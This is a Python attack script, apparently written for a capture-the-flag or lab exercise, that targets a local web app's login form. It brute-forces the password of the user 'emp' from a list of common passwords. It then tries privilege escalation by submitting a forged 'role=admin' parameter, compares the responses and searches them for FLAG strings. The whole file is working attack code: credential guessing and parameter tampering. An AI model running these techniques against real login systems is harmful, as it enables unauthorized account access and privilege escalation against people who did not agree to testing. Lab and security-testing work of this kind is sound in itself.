import requests
import json

target_url = "http://127.0.0.1:5003/login"
username = "emp"
passwords = ["password", "Password123", "emp123", "employee", "emppassword123", 
             "admin", "123456", "password123", "emp", "welcome"]

print("[*] Starting password brute-force for username: emp")
print("=" * 80)

valid_passwords = []

# Phase 1: Brute-force passwords
for password in passwords:
    data = {
        "username": username,
        "password": password
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(target_url, data=data, headers=headers, allow_redirects=False)
        
        print(f"\n[TEST] Password: {password}")
        print(f"  Status: {response.status_code}")
        print(f"  Headers: {dict(response.headers)}")
        
        if response.cookies:
            print(f"  Cookies: {dict(response.cookies)}")
        
        # Check for success indicators
        if response.status_code in [200, 302]:
            print(f"  Response body: {response.text}")
            
            # Consider it valid if we get 302 redirect or 200 with success message
            if response.status_code == 302 or "success" in response.text.lower() or "welcome" in response.text.lower():
                print(f"  [✓] VALID PASSWORD FOUND: {password}")
                valid_passwords.append(password)
            
    except Exception as e:
        print(f"  [ERROR] {e}")

print("\n" + "=" * 80)
print(f"[*] Valid passwords found: {valid_passwords}")
print("=" * 80)

# Phase 2: Role parameter manipulation testing
if valid_passwords:
    test_password = valid_passwords[0]
    print(f"\n[*] Testing role parameter manipulation with password: {test_password}")
    print("=" * 80)
    
    # Test 1: Login with role=employee
    print("\n[TEST 1] Login with role=employee (baseline)")
    data_employee = {
        "username": username,
        "password": test_password,
        "role": "employee"
    }
    
    try:
        resp_employee = requests.post(target_url, data=data_employee, headers=headers, allow_redirects=False)
        print(f"  Status: {resp_employee.status_code}")
        print(f"  Headers: {dict(resp_employee.headers)}")
        
        if resp_employee.cookies:
            print(f"  Cookies: {dict(resp_employee.cookies)}")
            
        print(f"  Response body: {resp_employee.text}")
        
        # Search for flags
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', resp_employee.text)
        if flags:
            print(f"  [!] FLAGS FOUND: {flags}")
            
    except Exception as e:
        print(f"  [ERROR] {e}")
    
    # Test 2: Login with role=admin
    print("\n[TEST 2] Login with role=admin (privilege escalation attempt)")
    data_admin = {
        "username": username,
        "password": test_password,
        "role": "admin"
    }
    
    try:
        resp_admin = requests.post(target_url, data=data_admin, headers=headers, allow_redirects=False)
        print(f"  Status: {resp_admin.status_code}")
        print(f"  Headers: {dict(resp_admin.headers)}")
        
        if resp_admin.cookies:
            print(f"  Cookies: {dict(resp_admin.cookies)}")
            
        print(f"  Response body: {resp_admin.text}")
        
        # Search for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp_admin.text)
        if flags:
            print(f"  [!] FLAGS FOUND: {flags}")
            
    except Exception as e:
        print(f"  [ERROR] {e}")
    
    # Test 3: Login without role parameter (default behavior)
    print("\n[TEST 3] Login without role parameter (default)")
    data_no_role = {
        "username": username,
        "password": test_password
    }
    
    try:
        resp_no_role = requests.post(target_url, data=data_no_role, headers=headers, allow_redirects=False)
        print(f"  Status: {resp_no_role.status_code}")
        print(f"  Headers: {dict(resp_no_role.headers)}")
        
        if resp_no_role.cookies:
            print(f"  Cookies: {dict(resp_no_role.cookies)}")
            
        print(f"  Response body: {resp_no_role.text}")
        
        # Search for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp_no_role.text)
        if flags:
            print(f"  [!] FLAGS FOUND: {flags}")
            
    except Exception as e:
        print(f"  [ERROR] {e}")
    
    # Analysis
    print("\n" + "=" * 80)
    print("[*] ANALYSIS - Role Parameter Manipulation")
    print("=" * 80)
    
    if 'resp_employee' in locals() and 'resp_admin' in locals():
        print(f"\nEmployee role response length: {len(resp_employee.text)}")
        print(f"Admin role response length: {len(resp_admin.text)}")
        
        if resp_employee.text != resp_admin.text:
            print("\n[!] RESPONSES DIFFER - Role parameter affects response")
            print("\n[DIFF] Content differences:")
            
            # Show what's in admin but not in employee
            if "admin" in resp_admin.text.lower() and "admin" not in resp_employee.text.lower():
                print("  - Admin response contains 'admin' references")
            
            # Check for privilege indicators
            if any(keyword in resp_admin.text.lower() for keyword in ["admin", "administrator", "elevated", "privileged"]):
                print("  - Admin response contains privilege indicators")
                print("\n[✓] ROLE ESCALATION LIKELY SUCCESSFUL")
        else:
            print("\n[×] Responses identical - Role parameter has no effect")
            
        # Cookie comparison
        if resp_employee.cookies and resp_admin.cookies:
            print("\n[COOKIES] Comparison:")
            print(f"  Employee cookies: {dict(resp_employee.cookies)}")
            print(f"  Admin cookies: {dict(resp_admin.cookies)}")
            
            if dict(resp_employee.cookies) != dict(resp_admin.cookies):
                print("  [!] Cookies differ between roles")
                
else:
    print("\n[×] No valid passwords found. Cannot proceed with role manipulation testing.")

print("\n[*] Testing complete")

